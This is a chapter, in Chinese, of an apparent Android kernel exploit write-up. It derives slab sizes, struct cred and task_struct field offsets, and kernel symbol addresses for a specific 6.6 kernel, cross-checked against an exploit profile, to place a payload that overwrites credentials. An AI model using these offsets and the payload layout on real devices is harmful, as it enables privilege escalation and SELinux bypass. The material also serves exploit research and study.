# 06 · slab 布局测量

**中文** · [English](en/06-slab-layout.md)

> 要精确打中目标对象，必须知道 slab 的几何参数。这一章讲我们怎么**从设备实测**
> 出这些数字，以及横跨多个数据源的交叉验证。

---

## 一、需要哪些数字

| 参数 | 用途 |
|---|---|
| `sizeof(struct k_itimer)` | 判断哪个分配是 timer |
| 每个 slab 的对象数 | 计算对象在页内的位置 |
| slab 大小（order） | 判断是 order-0 还是 order-1 |
| `node` 在对象内的偏移 | 计算 payload 落点 |
| `sizeof(struct cred)` | 找 cred 分配 |
| `cred_jar` 的几何 | 验证 cred 地址 |
| `task_struct.cred` 偏移 | 改 cred 指针 |
| `k_itimer` / `cred` / `task_struct` 的字段偏移 | 构造 payload |

---

## 二、数据源 1：`/proc/slabinfo`

```console
$ adb shell cat /proc/slabinfo | grep -E 'posix_timers|cred_jar|task_struct'
posix_timers_cache   1264   1302    264   31    2    1 : tunables ... : slabdata ...
cred_jar             2100   2142    192   21    1    1 : tunables ... : slabdata ...
task_struct           420    426   4800    6    8    1 : tunables ... : slabdata ...
```

列的含义：

```
name  active_objs  num_objs  objsize  objperslab  pagesperslab
```

于是：

| cache | objsize | objperslab | pagesperslab | 结论 |
|---|---|---|---|---|
| `posix_timers_cache` | **264** | **31** | **2** | **order-1（8 KB）** |
| `cred_jar` | **192** | **21** | **1** | order-0（4 KB）|
| `task_struct` | **4800** | 6 | 8 | order-3 |

### 验证 264 × 31

```
264 × 31 = 8184 ≤ 8192 ✓
264 × 32 = 8448 > 8192 ✗
```

**所以是 31 个对象 / 8KB slab。**

> ⚠️ 注意：Shark 的 popsicle profile 里 `KITIMER_BYTES = 0x100 (256)`、`SLAB_OBJECTS = 32`。
> **我们的是 264 / 31。** 这个差异很重要 —— 不能照抄。

---

## 三、数据源 2：Tracepoint 实测

### 3.1 找 timer 分配

```console
$ adb shell "cat /sys/kernel/tracing/trace | grep kmem_cache_alloc | grep -c ."
$ adb shell "cat /sys/kernel/tracing/trace | grep 'do_timer_create'"
```

实测看到的：

```
kmem_cache_alloc: call_site=do_timer_create+0xa4/... 
                  bytes_req=264 bytes_alloc=264
```

**`bytes_req = 264` 直接印证了 slabinfo 的 `objsize`。**

### 3.2 找 cred 分配

```
kmem_cache_alloc: call_site=prepare_creds+0x24/0x2fc
                  bytes_req=184 bytes_alloc=192
```

**注意 `bytes_req`（184 = `object_size`）和 `bytes_alloc`（192 = `size`）不一样。**

### 3.3 找 task 分配

```
kmem_cache_alloc: call_site=copy_process+0x140/0x1030
                  ptr=... bytes_req=4800 bytes_alloc=4800
```

**4800 = `task_struct` 的 `objsize`，和 slabinfo 一致。**

---

## 四、数据源 3：BTF（结构体字段偏移）

内核镜像里带 BTF。用工具解析可以得到精确的字段偏移：

| 字段 | 偏移 | 说明 |
|---|---|---|
| `task_struct.cred` | **0x820** | |
| `task_struct.real_cred` | **0x828** | |
| `cred.uid` / `.gid` | **0x08** | 两个 u32 |
| `cred.suid` / `.sgid` | **0x10** | |
| `cred.euid` / `.egid` | **0x18** | |
| `cred.fsuid` / `.fsgid` | **0x20** | |
| `cred.cap_inheritable` | **0x30** | |
| `cred.cap_permitted` | **0x38** | |
| `cred.cap_effective` | **0x40** | |
| `cred.cap_bset` | **0x48** | |
| `cred.cap_ambient` | **0x50** | |
| `cred.security` | **0x80** | SELinux blob |
| `cred.user` | **0x88** | |
| `cred.user_ns` | **0x90** | |
| `cred.ucounts` | **0x98** | |
| `cred.group_info` | **0xa0** | |
| `sizeof(struct cred)` | **0xb8 (184)** | |

### ★ 交叉验证：和 Shark 的 profile 对比

Shark 的 `K66118_plant.c` 里有一条专为我们内核写的 profile：

```c
"6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k",
    0xffffffc080195d48ULL,   // timer_site
    0x195d48ULL,             // timer_low21
    0x0ab93cULL,             // copy_low21
    0xffffffc08236a2e0ULL,   // selinux_state
    0xffffffc08211ae0cULL,   // panic_on_warn
    0xffffffc08213f1e0ULL,   // root_user
    0xffffffc08213ef50ULL,   // init_user_ns
    0xffffffc082140cb0ULL,   // init_ucounts
    0xffffffc082140740ULL,   // init_groups
```

**我们独立从 vmlinux 符号表提取的值：**

| 符号 | Shark profile | 我们的 vmlinux | |
|---|---|---|---|
| `selinux_state` | `0xffffffc08236a2e0` | `0xffffffc08236a2e0` | ✅ |
| `root_user` | `0xffffffc08213f1e0` | `0xffffffc08213f1e0` | ✅ |
| `init_user_ns` | `0xffffffc08213ef50` | `0xffffffc08213ef50` | ✅ |
| `init_ucounts` | `0xffffffc082140cb0` | `0xffffffc082140cb0` | ✅ |
| `init_groups` | `0xffffffc082140740` | `0xffffffc082140740` | ✅ |
| `do_timer_create+0xa8` | `0x80195d48` | `0x80195d48` | ✅ |
| `copy_process+0x140` | `0xab93c` | `0xab93c` | ✅ |

**七个全中。** 这既验证了我们的分析，也证明了这份 profile 就是为我们的内核写的。

---

## 五、数据源 4：反汇编确认 `node` 偏移

`k_itimer` 里 CPU timer 的树节点在哪？

我们反汇编了 `posix_cpu_timers_exit`：

```asm
; 三个 timerqueue_head 的地址
0x...  add  x?, x?, #0x778      ; nextevt
0x...  add  x?, x?, #0x790      ; nextevt (第二组)
0x...  add  x?, x?, #0x7a8      ; nextevt (第三组)
; tqhead + 8 = rb_leftmost
; 循环里：
0x...  bl   timerqueue_del
0x...  str  xzr, [node, #0x20]  ; 写 node-0x58 → 即 it_pid
```

结合 `struct k_itimer` 的布局：

```
k_itimer.it          @ 0x78   (union)
  .cpu               @ 0x00
    .node            @ 0x00   → timerqueue_node → rb_node @ 0x78
```

**⇒ `KITIMER_NODE = 0x78`。**

**这和 Shark 的 profile 一致（`node` 偏移 0x78）。**

---

## 六、把这些数字串起来

现在我们能做这几件事：

```
① 从 trace 拿到 k_itimer 的真实内核虚拟地址 victim
② node 地址 = victim + 0x78
③ 页内偏移 = (victim + 0x78) & 0xfff
④ slab 是 8KB（order-1），起始地址 = victim & ~0x1fff
⑤ victim 落在前 4KB 还是后 4KB：((victim & 0x1fff) >= 4096) ? 后半 : 前半
⑥ 要铺的 payload：node+0x00 = 0, node+0x08 = 0, node+0x10 = target
```

**这就是「精确 node 偏移」的完整推导链。**

---

## 七、为什么这些数字必须实测

| 项 | popsicle 的值 | 我们的值 | 差异后果 |
|---|---|---|---|
| `sizeof(k_itimer)` | `0x100` | **`0x108`** | 每 slab 对象数 32 → 31，页内布局全变 |
| `SLAB_OBJECTS` | 32 | **31** | |
| `node` 偏移 | 0x78 | 0x78 | 相同 |
| `MEMSTART_PFN` | 0x80000 | **实测不同** | `page_offset` 不同 |
| `TARGET_VMEMMAP_START` | `0xfffffffec0000000` | 未实测 | |

**「同一个 CVE，换一台机器，所有常量都要重测」—— 这是硬件漏洞利用的基本纪律。**
